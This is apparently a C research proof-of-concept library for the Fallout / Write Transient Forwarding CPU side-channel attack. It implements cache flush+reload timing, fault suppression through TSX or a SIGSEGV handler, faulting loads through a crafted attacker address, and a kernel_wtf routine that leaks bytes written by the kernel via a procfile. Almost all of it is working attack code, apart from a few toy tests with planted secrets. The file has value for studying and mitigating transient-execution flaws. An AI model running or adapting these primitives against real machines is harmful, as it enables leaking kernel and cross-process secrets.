#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

#if defined(__x86_64__)
int fallout_compatible(){return 1;}
#elif defined(__i386__)
int fallout_compatible(){return 1;}
#else
int fallout_compatible() { return 0; }
#endif


uint64_t *wtf_times;
ssize_t page_size;
uint8_t *attacker_address = (uint8_t *) 0xFFFF000000000000ull, *address_padding= (uint8_t*) UINT64_MAX;
int tsx_available = 0;
jmp_buf buf;


#ifdef TSX_AVAILABLE
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
    unsigned status;
    //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
    asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
    return status == ~0u;
}
static __attribute__((always_inline)) inline void xend(void) {
    //asm volatile("xend" ::: "memory");
    asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}
#endif

static inline void flush(void *p) {
#ifdef __x86_64__
    asm volatile("clflush (%0)\n" : : "r"(p) : "rax");
#else
    asm volatile("clflush (%0)\n" : : "r"(p) : "eax");
#endif
}

static inline void flush_mem(void * mem){
    for(int i = 0; i < 256; i++){
        flush(mem + page_size * i);
    }
}

static inline void maccess(void *p) {
#ifdef __x86_64__
    asm volatile("mov (%0), %%rax\n" : : "r"(p) : "rax");
#else
    asm volatile("movl (%0), %%eax\n" : : "r"(p) : "eax");
#endif
}

static inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
    asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
    asm volatile("rdtsc" : "=A"(a));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static inline void data_bounce_asm(void *ptr, void *mem, char arbitrary_value) {
#ifdef __x86_64__
    asm volatile("mov %%rax, (%0)\n"                                           \
                 "mov %%rdx, (%%rcx)\n"                                        \
                 "mov (%%rcx), %%rax\n"                                        \
                 "shl $0xC, %%rax\n"                                            \
                 "add %%rbx, %%rax\n"                                 \
                 "mov %%rax, (%%rax)\n"                                        \
               :                                                               \
               : "c"(ptr), "b"(mem), "d"(arbitrary_value), "r"(attacker_address)           \
               : "rax");
#else
    asm volatile("mov (%0), %%eax\n"                                           \
                 "mov %%edx, (%%ecx)\n"                                        \
                 "mov (%%ecx), %%eax\n"                                        \
                 "shl $12, %%eax\n"                                            \
                 "add %%ebx, %%eax\n"                                 \
                 "mov %%eax, (%%eax)\n"                                        \
               :                                                               \
               : "c"(ptr), "b"(mem), "d"(arbitrary_value), "r"(NULL)           \
               : "eax");
#endif
}

static inline uint64_t __attribute__((always_inline)) measure_flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    return end - start;
}

static inline uint64_t __attribute__((always_inline)) measure_access_time(void *ptr) {
    uint64_t start = 0, end = 0;
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    return end - start;
}

#ifndef TSX_AVAILABLE
static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void) signum;
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}
#endif

static inline int get_min(uint64_t* buffer, int len){
    int min_i = 0;
    uint64_t min = UINT64_MAX;
    for (int i = 0; i < len; i++) {
        if (buffer[i] < min) {
            min = buffer[i];
            min_i = i;
        }
    }
    return min_i;
}

#ifdef TSX_AVAILABLE
#define FALLOUT_DATA_BOUNCE if(xbegin()){data_bounce_asm(ptr, mem, magic_number);xend();}
#else
#define FALLOUT_DATA_BOUNCE if (!setjmp(buf)) data_bounce_asm(ptr, mem, magic_number);
#endif

static inline int _data_bounce(void *mem, void *ptr) {
    int i;
    char magic_number = 42;
    sched_yield();
    for (i = 0; i < 256; i++) {
        flush(mem + (i << 12));
    }
    FALLOUT_DATA_BOUNCE
    for (i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    int min_i = get_min(wtf_times, 256);
    return min_i == magic_number;
}

int data_bounce(void *mem, void *ptr, int repeats){
    int i, hits = 0;
    for(i = 0; i < repeats; i++) {
        sched_yield();
        hits += _data_bounce(mem, ptr);
    }
    return hits;
}

static inline int fetch_and_bounce(void *mem, void *ptr) {
    uint64_t *times = malloc(sizeof(uint64_t) * 256);
    char magic_number = 42;
    for (int i = 0; i < 256; i++) {
        flush(mem + i * 4096);
    }
    int retry = 0;
    while (retry < 2) {
        if (setjmp(buf) == 0) {
            data_bounce_asm(ptr, mem, magic_number);
        }
        for (int i = 0; i < 256; i++) {
            times[i] = measure_flush_reload(mem + i * 4096);
        }
        int min_i = 0;
        uint64_t min = times[0];
        for (int i = 0; i < 256; i++) {
            if (times[i] < min) {
                min = times[i];
                min_i = i;
            }
        }
        if (min_i == magic_number) break;
        retry++;
    }
    return retry;
}

int flush_cache(void *mem){
    flush_mem(mem);
}

#ifdef TSX_AVAILABLE
#define FALLOUT_FAULTY_LOAD if(xbegin()){maccess(mem + page_size * attacker_address[page_offset]);xend();}
#else
#define FALLOUT_FAULTY_LOAD if (!setjmp(buf)) maccess(mem + page_size * attacker_address[page_offset]);
#endif

int toy_wtf(void *mem, int page_offset, int secret_value) {
    uint8_t* test = aligned_alloc(page_size, page_size);
    flush_mem(mem);
    for(int i = 0; i < 20; i++) test[i] = i;
    test[page_offset] = secret_value;
    FALLOUT_FAULTY_LOAD
    for (int i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    munmap(test, page_size);
    return get_min(wtf_times, 256) == secret_value;
}

void toy_write(int offset, uint8_t secret){
    uint8_t buffer[4096<<1];
    ((uint8_t*)((uint64_t)(&buffer[4096]) & (UINT64_MAX ^ 0xFFF)))[offset] = secret;
}

volatile int toy_wtf_v2(void *mem, int page_offset, int secret_value) {
    uint8_t* test = aligned_alloc(page_size, page_size);
    flush_mem(mem);
    for(int i = 0; i < 56; i++) test[i] = i;
    toy_write(page_offset, (uint8_t) secret_value);
    FALLOUT_FAULTY_LOAD
    for (int i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    munmap(test, page_size);
    return get_min(wtf_times, 256) == secret_value;
}

static inline int _wtf(void *mem, int page_offset) {
    int i;
    FALLOUT_FAULTY_LOAD
    for (i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    return get_min(wtf_times, 256);
}

int wtf(void *mem, int page_offset) {
    return _wtf(mem, page_offset);
}

#ifdef TSX_AVAILABLE
#define FALLOUT_FAULTY_LOAD_K if(xbegin()){maccess(mem + (attacker_address_k[(response[1]<<8)|response[2]]<<12));xend();}
#else
#define FALLOUT_FAULTY_LOAD_K if (!setjmp(buf)) maccess(mem + (attacker_address_k[(response[1]<<8)|response[2]]<<12));
#endif

int kernel_wtf(void* mem, int procfile){
    uint8_t *attacker_address_k = aligned_alloc(page_size, page_size);
    mprotect(attacker_address_k, page_size, PROT_NONE);
    unsigned int result, i = 0;
    unsigned char response[sizeof(unsigned int) + 2];
    memset(response, 0, sizeof(unsigned int) + 2);
    flush_cache(mem);
    lseek(procfile, 0, SEEK_SET);
    read(procfile, response, sizeof(unsigned int));
    FALLOUT_FAULTY_LOAD_K
    for (; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    result = get_min(wtf_times, 256);
    //printf("Response: 0x%x, 0x%03x\n", (uint8_t)response[0], (response[1]<<8)|response[2]);
    free(attacker_address_k);
    return result == (uint8_t)response[0];
}


int fallout_init() {
#ifndef TSX_AVAILABLE
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("%s", "Failed to setup signal handler\n");
        return 0;
    }
#endif
    page_size = getpagesize();
    wtf_times = malloc(sizeof(uint64_t) * 256);
    return 1;
}

void fallout_cleanup(){
    free(wtf_times);
}
